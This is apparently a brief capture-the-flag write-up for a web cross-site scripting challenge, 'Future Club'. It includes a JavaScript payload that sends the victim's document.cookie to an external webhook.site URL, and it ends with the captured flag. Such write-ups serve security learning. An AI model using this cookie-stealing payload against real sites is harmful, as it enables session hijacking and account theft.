# Web: Cross Site Scripting: Future Club

Get the flag from ctf-05.

We first type our script </script>alert(1)</script> then we notice that we need to fill in every blank input.
We fill in and we observe that we inputs double double and then shrink.
So, we need the webhook.

Then we make our script: 
```
Image().src='https://webhook.site/35143c47-3cee-4fa8-bf7d-7485e152403f?cookie='+document.cookie
```

And then we get our flag: **SSS{future_club_obfuscation}**.
